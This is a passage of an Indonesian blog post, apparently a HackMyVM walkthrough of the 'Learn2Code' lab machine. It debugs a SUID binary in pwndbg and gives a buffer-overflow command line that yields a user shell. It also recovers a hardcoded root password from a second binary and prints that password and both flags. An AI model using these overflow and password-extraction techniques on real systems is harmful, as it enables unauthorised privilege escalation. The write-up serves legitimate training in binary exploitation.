+<p>saya menganalisis bahwa <code class="language-plaintext highlighter-rouge">modified</code> adalah <strong>variable</strong> yang entah nilainya berapa dan harus digantikan dengan nilai <code class="language-plaintext highlighter-rouge">0x61626364</code> yang mana hasil stringnya adalah <code class="language-plaintext highlighter-rouge">dcba</code> dan jika hasilnya bisa mencapai nilai string tersebut maka kita akan dibawa elevasi ke user yaitu <code class="language-plaintext highlighter-rouge">learner</code> dengan rumusnya harus bisa mendekati <code class="language-plaintext highlighter-rouge">setuid</code> dan <code class="language-plaintext highlighter-rouge">setgid</code> untuk mengeksekusi shell <code class="language-plaintext highlighter-rouge">0x0000206d</code> dengan string <code class="language-plaintext highlighter-rouge">/bin/bash</code>.</p>
+
+<p>-</p>
+
+<p>cukup ribet sih kalau ingin dijelaskan.</p>
+
+<p>tapi sebelum itu saya memastikan apakah learner adalah seorang user?</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Learn2Code:/var/www/html/includes/php$ grep -i sh$ /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+learner:x:1000:1000:learner,,,:/home/learner:/bin/bash
+</code></pre></div></div>
+<p>karena sudah terjawab, maka saya melanjutkan sisi yang lain. karena memang cuma ada 2 user doang.</p>
+
+<p>lanjut lagi, saya beranjak untuk menjalankan radare dan melihat isi <code class="language-plaintext highlighter-rouge">dissassembled code</code> dari fungsi <code class="language-plaintext highlighter-rouge">main</code>.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via <span class="o">[</span>machines/learn2code]
+╰─ file MakeMeLearner                
+MakeMeLearner: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>bb387daabdaf0f68bfa1a29f8b8190c076dd6ad8, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+╭─ via <span class="o">[</span>machines/learn2code]
+╰─ checksec MakeMeLearner
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/via/ctfs/hmv/machines/learn2code/MakeMeLearner'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled 
+╭─ via <span class="o">[</span>machines/learn2code]
+╰─ gdb-pwndbg MakeMeLearner
+Reading symbols from MakeMeLearner...
+<span class="o">(</span>No debugging symbols found <span class="k">in </span>MakeMeLearner<span class="o">)</span>
+pwndbg: loaded 197 commands. Type pwndbg <span class="o">[</span>filter] <span class="k">for </span>a list.
+pwndbg: created <span class="nv">$rebase</span>, <span class="nv">$ida</span> gdb functions <span class="o">(</span>can be used with print/break<span class="o">)</span>
+pwndbg&gt; r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*80)'</span><span class="si">)</span>
+Starting program: /home/via/ctfs/hmv/machines/learn2code/MakeMeLearner <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print("A"*80)'</span><span class="si">)</span>
+<span class="o">[</span>Thread debugging using libthread_db enabled]
+Using host libthread_db library <span class="s2">"/usr/lib/libthread_db.so.1"</span><span class="nb">.</span>
+Change the <span class="s1">'modified'</span> variable value to <span class="s1">'0x61626364'</span> to be a learnerTry again, you got 0x41414141
+<span class="o">[</span>Inferior 1 <span class="o">(</span>process 273577<span class="o">)</span> exited normally]
+pwndbg&gt;
+</code></pre></div></div>
+
+<p>batin saya “halah bajingan”, ga tau kenapa saya suka menantang diri saya tapi suka batin sendiri gini. bukan karena kesel, tapi karena saya tipikal hal yang suka repot tapi suka nyesel sendiri kalo udah masuk yang repot-repot gini.</p>
+
+<p>Oke saya jelaskan dulu bagaimana proses <code class="language-plaintext highlighter-rouge">executable</code> di atas untuk bisa ditebak jalan kerjanya. kalo gini saya lebih enak menjelaskannya lewat <code class="language-plaintext highlighter-rouge">pwndbg</code>.
+jika ingin melihat lebih jelas maka saya menjalankan <code class="language-plaintext highlighter-rouge">binary</code> tersebut dengan menggunakan jumlah random byte <code class="language-plaintext highlighter-rouge">80</code> untuk menguji apakah huruf <code class="language-plaintext highlighter-rouge">A</code> ini nanti masuk ke target yang dimaksudkan dan ternyata sudah masuk ke <code class="language-plaintext highlighter-rouge">stack</code> yaitu dengan nilai <code class="language-plaintext highlighter-rouge">0x41414141</code>.</p>
+
+<p>jangan lupa untuk breakpoint di tempat yang penting!</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; disass main
+Dump of assembler code <span class="k">for function </span>main:
+   0x0000555555555185 &lt;+0&gt;:	push   rbp
+   0x0000555555555186 &lt;+1&gt;:	mov    rbp,rsp
+   0x0000555555555189 &lt;+4&gt;:	sub    rsp,0x60
+   0x000055555555518d &lt;+8&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x54],edi
+   0x0000555555555190 &lt;+11&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x60],rsi
+   0x0000555555555194 &lt;+15&gt;:	cmp    DWORD PTR <span class="o">[</span>rbp-0x54],0x1
+   0x0000555555555198 &lt;+19&gt;:	jne    0x5555555551b0 &lt;main+43&gt;
+   0x000055555555519a &lt;+21&gt;:	lea    rsi,[rip+0xe67]        <span class="c"># 0x555555556008</span>
+   0x00005555555551a1 &lt;+28&gt;:	mov    edi,0x1
+   0x00005555555551a6 &lt;+33&gt;:	mov    eax,0x0
+   0x00005555555551ab &lt;+38&gt;:	call   0x555555555040 &lt;errx@plt&gt;
+   0x00005555555551b0 &lt;+43&gt;:	lea    rdi,[rip+0xe71]        <span class="c"># 0x555555556028</span>
+   0x00005555555551b7 &lt;+50&gt;:	mov    eax,0x0
+   0x00005555555551bc &lt;+55&gt;:	call   0x555555555060 &lt;<span class="nb">printf</span>@plt&gt;
+   0x00005555555551c1 &lt;+60&gt;:	mov    DWORD PTR <span class="o">[</span>rbp-0x4],0x0
+   0x00005555555551c8 &lt;+67&gt;:	mov    rax,QWORD PTR <span class="o">[</span>rbp-0x60]
+   0x00005555555551cc &lt;+71&gt;:	add    rax,0x8
+   0x00005555555551d0 &lt;+75&gt;:	mov    rdx,QWORD PTR <span class="o">[</span>rax]
+   0x00005555555551d3 &lt;+78&gt;:	lea    rax,[rbp-0x50]
+   0x00005555555551d7 &lt;+82&gt;:	mov    rsi,rdx
+   0x00005555555551da &lt;+85&gt;:	mov    rdi,rax
+   0x00005555555551dd &lt;+88&gt;:	call   0x555555555030 &lt;strcpy@plt&gt;
+   0x00005555555551e2 &lt;+93&gt;:	mov    eax,DWORD PTR <span class="o">[</span>rbp-0x4]
+   0x00005555555551e5 &lt;+96&gt;:	cmp    eax,0x61626364
+   0x00005555555551ea &lt;+101&gt;:	jne    0x55555555520e &lt;main+137&gt;
+   0x00005555555551ec &lt;+103&gt;:	mov    edi,0x3e8
+   0x00005555555551f1 &lt;+108&gt;:	call   0x555555555080 &lt;setuid@plt&gt;
+   0x00005555555551f6 &lt;+113&gt;:	mov    edi,0x3e8
+   0x00005555555551fb &lt;+118&gt;:	call   0x555555555070 &lt;setgid@plt&gt;
+   0x0000555555555200 &lt;+123&gt;:	lea    rdi,[rip+0xe66]        <span class="c"># 0x55555555606d</span>
+   0x0000555555555207 &lt;+130&gt;:	call   0x555555555050 &lt;system@plt&gt;
+   0x000055555555520c &lt;+135&gt;:	jmp    0x555555555224 &lt;main+159&gt;
+   0x000055555555520e &lt;+137&gt;:	mov    eax,DWORD PTR <span class="o">[</span>rbp-0x4]
+   0x0000555555555211 &lt;+140&gt;:	mov    esi,eax
+   0x0000555555555213 &lt;+142&gt;:	lea    rdi,[rip+0xe5d]        <span class="c"># 0x555555556077</span>
+   0x000055555555521a &lt;+149&gt;:	mov    eax,0x0
+   0x000055555555521f &lt;+154&gt;:	call   0x555555555060 &lt;<span class="nb">printf</span>@plt&gt;
+   0x0000555555555224 &lt;+159&gt;:	mov    eax,0x0
+   0x0000555555555229 &lt;+164&gt;:	leave  
+   0x000055555555522a &lt;+165&gt;:	ret
+pwndbg&gt; b <span class="k">*</span> 0x0000555555555185
+Breakpoint 1 at 0x555555555185
+pwndbg&gt; b <span class="k">*</span> 0x00005555555551bc
+Breakpoint 2 at 0x5555555551bc
+</code></pre></div></div>
+<p>ketika saya jalankan, saya melihat ada <code class="language-plaintext highlighter-rouge">0x7fffffffdf08</code> sebagai nilai dari <code class="language-plaintext highlighter-rouge">RSP</code> pertama. bagaimana jika saya melanjutkan ke instruksi untuk ketiga kalinya maka saya bisa menebak kalau itu adalah ketetapan <code class="language-plaintext highlighter-rouge">RSP</code> yang terus menerus bergeser sampai ke bagian <code class="language-plaintext highlighter-rouge">stack low memory</code>. Dari sini saya ingin melihat berapa nilai byte dari <code class="language-plaintext highlighter-rouge">RBP</code> nantinya.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x555555555185 &lt;main&gt;       push   rbp -&gt; RSP 0x7fffffffdf08
+ ► 0x555555555186 &lt;main+1&gt;     mov    rbp, rsp -&gt; RSP  0x7fffffffdf00 ◂— 0x2 &amp; RBP have a same value.
+</code></pre></div></div>
+<p>Bisa diketahui <code class="language-plaintext highlighter-rouge">base</code> dari <code class="language-plaintext highlighter-rouge">RBP</code> adalah <code class="language-plaintext highlighter-rouge">8 bytes</code>. lalu pada instruksi selanjutnya?</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x555555555189 &lt;main+4&gt;     sub    rsp, 0x60 -&gt; RSP 0x7fffffffdf00 
+ ► 0x55555555518d &lt;main+8&gt;     mov    dword ptr [rbp - 0x54], edi -&gt; *RSP  0x7fffffffdea0 ◂— 0x400000009 /* '\t' */
+</code></pre></div></div>
+<p>pada <code class="language-plaintext highlighter-rouge">0x555555555189</code> terdapat nilai <code class="language-plaintext highlighter-rouge">0x60</code> yang artinya <code class="language-plaintext highlighter-rouge">96</code> secara desimal dan itu akan disubstraksikan dengan <code class="language-plaintext highlighter-rouge">rsp</code>. karena saya penasaran berapa hasil dari nilai stack <strong>X = <code class="language-plaintext highlighter-rouge">0x7fffffffdea0</code> - <code class="language-plaintext highlighter-rouge">0x7fffffffdf00</code></strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─ via [machines/learn2code]
+╰─ rax2 0x7fffffffdf00 - 0x7fffffffdea0
+140737488346880
+140737488346784
+╭─ via [machines/learn2code]
+╰─ expr 140737488346880 - 140737488346784
+96
+</code></pre></div></div>
+<p>maka nilai <strong>X = 96</strong>.<br />
+Well kalau begini artinya <code class="language-plaintext highlighter-rouge">RBP = 8</code> dan <code class="language-plaintext highlighter-rouge">RSP = 96</code>.</p>
+
+<p>Lalu saya melanjutkan lagi sampai pada <code class="language-plaintext highlighter-rouge">0x5555555551c8</code> karena instruksi <code class="language-plaintext highlighter-rouge">rax</code> berubah menjadi <code class="language-plaintext highlighter-rouge">0x44</code> yang arti desimalnya adalah <code class="language-plaintext highlighter-rouge">68</code>. yang jika dikurangi nilai <code class="language-plaintext highlighter-rouge">rbp = 88</code> ke <code class="language-plaintext highlighter-rouge">rax</code> maka, <code class="language-plaintext highlighter-rouge">20</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/30wx $rsp
+0x7fffffffdea0:	0xffffe018	0x00007fff	0x00000000	0x00000002
+0x7fffffffdeb0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffdec0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffded0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffdee0:	0x00000000	0x00000000	0xf7fe6c00	0x00007fff
+0x7fffffffdef0:	0x00000000	0x00000000	0xf7ffdab0	0x00000000
+0x7fffffffdf00:	0x00000002	0x00000000	0xf7dd7290	0x00007fff
+0x7fffffffdf10:	0xffffe000	0x00007fff
+pwndbg&gt; x/i $rsp
+   0x7fffffffdea0:	sbb    al,ah
+pwndbg&gt; x/i $rip
+=&gt; 0x5555555551d3 &lt;main+78&gt;:	lea    rax,[rbp-0x50]
+</code></pre></div></div>
+<p>wait, saya malah bingung ini. kalau <code class="language-plaintext highlighter-rouge">rbp-0x50</code> adalah <code class="language-plaintext highlighter-rouge">80</code> terus untuk apa?. 
+ataukah berarti <code class="language-plaintext highlighter-rouge">16 bytes</code> atau satu <code class="language-plaintext highlighter-rouge">stack frame</code> dari <code class="language-plaintext highlighter-rouge">0x7fffffffdea0</code> itu tidak dipakai? atau bagaimana?</p>
+
+<p>karena saya orangnya bodoamatan maka saya akan melanjutkan dengan melihat ekstraksi sampai menemukan hal yang janggal.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ► 0x5555555551dd &lt;main+88&gt;     call   strcpy@plt                &lt;strcpy@plt&gt;
+        dest: 0x7fffffffdeb0 ◂— 0x0
+        src: 0x7fffffffe31e ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+</code></pre></div></div>
+<p>di atas ini adalah kejanggalan saya di mana nilai <code class="language-plaintext highlighter-rouge">bunch of A's</code> adalah <code class="language-plaintext highlighter-rouge">src</code> ditetapkan pada address <code class="language-plaintext highlighter-rouge">0x7fffffffe31e</code>? lalu <code class="language-plaintext highlighter-rouge">dest</code> dengan address <code class="language-plaintext highlighter-rouge">0x7fffffffdeb0</code> memiliki nilai <code class="language-plaintext highlighter-rouge">0x0</code>, hadeh. yang tadinya kirain saya ekstraksinya bakalan waw ternyata sama saja.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/30wx $rsp
+0x7fffffffdea0:	0xffffe018	0x00007fff	0x00000000	0x00000002
+0x7fffffffdeb0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffdec0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffded0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffdee0:	0x00000000	0x00000000	0xf7fe6c00	0x00007fff
+0x7fffffffdef0:	0x00000000	0x00000000	0xf7ffdab0	0x00000000
+0x7fffffffdf00:	0x00000002	0x00000000	0xf7dd7290	0x00007fff
+0x7fffffffdf10:	0xffffe000	0x00007fff
+</code></pre></div></div>
+<p>lihat? nilai <code class="language-plaintext highlighter-rouge">0xdeb0</code> masih <code class="language-plaintext highlighter-rouge">0x0</code>. ketika saya <code class="language-plaintext highlighter-rouge">next instruction</code> lagi, saya mendapatkan sesuatu yang menakjubkan pada ekstraksi dan <code class="language-plaintext highlighter-rouge">instruction</code> yang ada di <code class="language-plaintext highlighter-rouge">dissassembled code</code>,</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ► 0x5555555551e2 &lt;main+93&gt;     mov    eax, dword ptr [rbp - 4]
+   0x5555555551e5 &lt;main+96&gt;     cmp    eax, 0x61626364 
+
+pwndbg&gt; x/30wx $rsp
+0x7fffffffdea0:	0xffffe018	0x00007fff	0x00000000	0x00000002
+0x7fffffffdeb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdec0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffded0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdee0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdef0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffdf00:	0x00000000	0x00000000	0xf7dd7290	0x00007fff
+0x7fffffffdf10:	0xffffe000	0x00007fff
+</code></pre></div></div>
+<p>maka jika <code class="language-plaintext highlighter-rouge">0x50</code> adalah 80, saya memastikan bahwa tadi yang mana <code class="language-plaintext highlighter-rouge">rbp-0x50</code> lalu bertemu dengan nilai <code class="language-plaintext highlighter-rouge">rax</code> adalah <code class="language-plaintext highlighter-rouge">0x44</code> dan nilai asli <code class="language-plaintext highlighter-rouge">rbp</code> adalah <code class="language-plaintext highlighter-rouge">0x8</code> maka jawaban yang tepat untuk mengisi huhu :( itu berarti <code class="language-plaintext highlighter-rouge">4</code>. dan <code class="language-plaintext highlighter-rouge">0x50 - 0x4</code> = <code class="language-plaintext highlighter-rouge">76 bytes</code> untuk jumlah <code class="language-plaintext highlighter-rouge">A</code> dan + 4 dengan nilai <code class="language-plaintext highlighter-rouge">dcba</code> yang artinya <code class="language-plaintext highlighter-rouge">0x61626364</code> biar nilainya sama jika dikomparasi dan bisa mendapatkan shell dari <code class="language-plaintext highlighter-rouge">learner</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x55555555521f &lt;main+154&gt;           call   printf@plt                &lt;printf@plt&gt;
+        format: 0x555555556077 ◂— 'Try again, you got 0x%08x\n'
+        vararg: 0x41414141
+</code></pre></div></div>
+<p>see? failed. dan benar ini seperti sudah melebihi karena <code class="language-plaintext highlighter-rouge">vararg</code> itu jumlah <code class="language-plaintext highlighter-rouge">A</code> yang mempunyai nilai hex <code class="language-plaintext highlighter-rouge">0x41414141</code>.</p>
+
+<div style="padding-top: 5x"></div>
+
+<p>dengan <code class="language-plaintext highlighter-rouge">run $(python -c 'print("A"*76)')</code>. bagian stack <code class="language-plaintext highlighter-rouge">0x7fffffffdefc</code> mempunyai ekstraksi <code class="language-plaintext highlighter-rouge">0x00000000</code> yang mana ini harus dimodifikasi menjadi <code class="language-plaintext highlighter-rouge">dcba</code> agar nantinya melengkapi nilai keseluruhan buffer <code class="language-plaintext highlighter-rouge">80</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; x/4x 0x7fffffffdef0
+0x7fffffffdef0:	0x41414141	0x41414141	0x41414141	0x00000000 --&gt; 0xdefc
+pwndbg&gt; 
+</code></pre></div></div>
+<h2 id="shell-as-learner">shell as learner</h2>
+<p>Dan jika saya coba.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Learn2Code:/dev/shm$ /usr/bin/MakeMeLearner $(python -c 'print("A"*76 + "dcba")')
+learner@Learn2Code:/dev/shm$ cat /home/learner/user.txt
+N1c3m0veMat3!
+</code></pre></div></div>
+<h2 id="privilege-escalation">privilege escalation</h2>
+
+<p>ini cuma decompile dan urusan bakal selesai.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>learner@Learn2Code:/home/learner$ ls
+MySecretPasswordVault  linpeas.sh  user.txt
+learner@Learn2Code:/home/learner$
+</code></pre></div></div>
+<p>yap, saya telah menggunakan <code class="language-plaintext highlighter-rouge">linpeas.sh</code> tapi tetap tidak memunculkan jalan alternatif untuk eskalasi. dan di atas cuma ada <code class="language-plaintext highlighter-rouge">MySecretPasswordVault</code> executable yang harus ditelisik lagi huh.</p>
+
+<p>transfer <em>executable</em> itu ke local machine dan analyzing menggunakan <code class="language-plaintext highlighter-rouge">radare2</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>│           0x55ecd261c13d      488d05c40e00.  lea rax, str.NOI98hO    ; 0x55ecd261d008 ; "NOI98hO"
+│           0x55ecd261c144      488945f8       mov qword [var_8h], rax
+│           0x55ecd261c148      488d05c10e00.  lea rax, [0x55ecd261d010] ; "Ihj"
+│           0x55ecd261c14f      488945f0       mov qword [var_10h], rax
+│           0x55ecd261c153      488d05ba0e00.  lea rax, str.__Jj       ; 0x55ecd261d014 ; ")(Jj"
+</code></pre></div></div>
+<p>dan jika disusun akan menjadi <code class="language-plaintext highlighter-rouge">NOI98hOIhj)(Jj</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>learner@Learn2Code:/home/learner$ su root
+Password: 
+root@Learn2Code:/home/learner# cat /root/root.txt
+Y0uG0TitbR0!
+</code></pre></div></div>
+
+<h2 id="references">References</h2>
+<ul>
+  <li><a href="https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000001-stack-based-overflow-50fe48d58f10">https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000001-stack-based-overflow-50fe48d58f10</a></li>
+  <li><a href="https://hacksland.net/protostar-stack0-tutorial">https://hacksland.net/protostar-stack0-tutorial</a></li>
+  <li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes</a></li>
+  <li><a href="https://github.com/rosehgal/BinExp/blob/master/Lecture2/README.md">https://github.com/rosehgal/BinExp/blob/master/Lecture2/README.md</a></li>
+  <li><a href="https://github.com/PHPGangsta/GoogleAuthenticator/blob/master/PHPGangsta/GoogleAuthenticator.php">https://github.com/PHPGangsta/GoogleAuthenticator/blob/master/PHPGangsta/GoogleAuthenticator.php</a></li>
+  <li><a href="https://gist.github.com/sharpicx/c70f69eb8fe318bf8979b095a3a34012">https://gist.github.com/sharpicx/c70f69eb8fe318bf8979b095a3a34012</a></li>
+</ul>
+
+  </div>
+  <div class="post-info" style="padding-top: 25px">
+    <div class="post-date">
+      2022-10-15.
+    </div>
+    <div class="post-categories">
+      <span></span>
+      
+      <a href="/category/hackmyvm" class="post-category">hackmyvm</a>
+      
+    </div>
+    <div class="post-tags">
+      <span></span>
+      
+      <a href="/tag/php-code-authentication" class="post-tag">php-code-authentication</a>
+      
+      <a href="/tag/bypass-python-sandbox" class="post-tag">bypass-python-sandbox</a>
+      
+      <a href="/tag/rce" class="post-tag">RCE</a>
+      
+      <a href="/tag/stack-based-overflow" class="post-tag">stack-based overflow</a>
+      
+      <a href="/tag/reversing" class="post-tag">reversing</a>
+      
+    </div>
+    <div class="post-tools">
+      
+      <div>
+        <span></span><a href="/hmv-suidyrevenge">HackMyVM: suidyrevenge</a>
+      </div>
+      
+      
+      <div>
+        <span></span><a href="/hmv-discover">HackMyVM: Discover</a>
+      </div>
+      
+    </div>
+    
+  </div>
+</article>
+
+    </main>
+    <footer class="container-footer">
+      <div class="footer-copyright">
+  <span class="footer-copyright-text float-left">Copyright &copy; 2022.  sharpicx.</span>
+  <span class="footer-copyright-text float-right">
+    Powered by <a href="https://jekyllrb.com/">Jekyll</a>
+  </span>
+</div>
+
+    </footer>
+  </div>
+</body>
+</html>
